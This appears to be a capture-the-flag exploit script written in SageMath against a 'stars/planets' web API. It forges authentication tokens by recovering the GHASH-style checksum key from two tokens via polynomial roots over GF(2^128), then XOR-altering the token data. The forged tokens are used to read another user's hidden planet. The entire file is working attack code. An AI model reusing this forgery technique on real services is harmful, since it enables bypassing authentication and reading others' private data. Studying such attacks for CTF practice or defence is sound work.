#!/usr/bin/env sage3

import sys
import struct
import base64
import string
import urllib
import random
import hashlib
import requests

from typing import List, Dict, Tuple


IP = sys.argv[1]
PORT = 17171
URL = f'http://{IP}:{PORT}'


size = 128
F.<z> = GF(2^size)
P.<X> = PolynomialRing(F)


def random_string(length: int=32):
    return ''.join(random.sample(string.ascii_letters, length))


def get_star(star_id: str) -> Dict:
    return requests.get(f'{URL}/api/stars/{star_id}').json()


def get_planet(planet_id: str, token: str='') -> Dict:
    return requests.get(f'{URL}/api/planets/{planet_id}', cookies={'token': token}).json()


def add_star() -> Tuple:
    star = {
        'name': random_string(),
        'location': random_string()
    }
    response = requests.post(f'{URL}/api/stars/', json=star)
    return response.cookies.get('token', ''), response.json()


def add_planet(star_id: str, token: str, private: bool=False) -> Tuple:
    planet = {
        'starId': star_id,
        'name': random_string(),
        'location': random_string(),
        'planetType': random.randint(1, 3),
        'isHidden': private
    }
    response = requests.post(f'{URL}/api/planets/', json=planet, cookies={'token': token})
    return response.cookies.get('token', ''), response.json()


def parse_token(token: str) -> Tuple:
    token_data = base64.b64decode(urllib.parse.unquote_plus(token))
    dataLength, ownerLength, checksumLength = struct.unpack('<III', token_data[:12])
    return (
        token_data[12:12+dataLength], 
        token_data[12+dataLength:12+dataLength+ownerLength],
        token_data[12+dataLength+ownerLength:12+dataLength+ownerLength+checksumLength]
    )


def build_token(data: bytes, owner: bytes, checksum: bytes) -> str:
    lengths = struct.pack('<III', len(data), len(owner), len(checksum))
    return urllib.parse.quote_plus(base64.b64encode(lengths + data + owner + checksum))


def xor(b1: bytes, b2: bytes) -> bytes:
    return bytes(x^^y for x, y in zip(b1, b2))


def md5(x: str) -> str:
    return hashlib.md5(x.encode()).hexdigest()


def int_to_block(x: int) -> bytes:
    return int(x).to_bytes(16, 'big')


def block_to_int(x: bytes) -> int:
    return int.from_bytes(x, 'big')


def int_to_poly(x: int):
    return sum(int(b) * z^i for i, b in enumerate(bin(x)[2:].rjust(size, '0')))


def poly_to_int(poly):
    x = 0
    for i, b in enumerate(poly._vector_()):
        x |= int(b) << (127 - i)
    return x


def split_bytes_to_blocks(x: bytes) -> List:
    x += b'\x00' * ((16 - len(x) % 16) % 16)
    return [x[i:i+16] for i in range(0, len(x), 16)]


def bytes_to_poly(x: bytes):
    return list(map(int_to_poly, map(block_to_int, split_bytes_to_blocks(x))))


def forge_token(planet_id1: str, token1: str, token2: str, required_planet_id: str) -> str:
    data1, owner1, checksum1 = parse_token(token1)
    data2, owner2, checksum2 = parse_token(token2)

    length1 = int_to_block(8 * ((len(owner1) << 64) | len(data1)))
    length2 = int_to_block(8 * ((len(owner2) << 64) | len(data2)))

    elements1 = sum(map(bytes_to_poly, [owner1, data1, length1, checksum1]), [])
    elements2 = sum(map(bytes_to_poly, [owner2, data2, length2, checksum2]), [])

    f1 = sum(element * X^i for i, element in enumerate(reversed(elements1)))
    f2 = sum(element * X^i for i, element in enumerate(reversed(elements2)))

    data = xor(data1, xor(
        f'["{md5(planet_id1)}"]'.encode(), 
        f'["{md5(required_planet_id)}"]'.encode()))

    owner = owner1

    length = int_to_block(8 * ((len(owner) << 64) | len(data)))

    elements = sum(map(bytes_to_poly, [owner, data, length]), [])

    f = sum(element * X^(i+1) for i, element in enumerate(reversed(elements)))

    for root in (f1 + f2).roots():
        checksum = int_to_block(poly_to_int((f + f1)(root[0])))
        yield build_token(data, owner, checksum)


def main():
    secret_token, secret_star = add_star()
    secret_token, secret_planet = add_planet(secret_star['id'], secret_token, true)
    
    token, star = add_star()
    token1, planet1 = add_planet(star['id'], token)
    token2, planet2 = add_planet(star['id'], token)


    for fake_token in forge_token(planet1['id'], token1, token2, secret_planet['id']):
        print(get_planet(secret_planet['id'], fake_token))


if __name__ == '__main__':
    main()
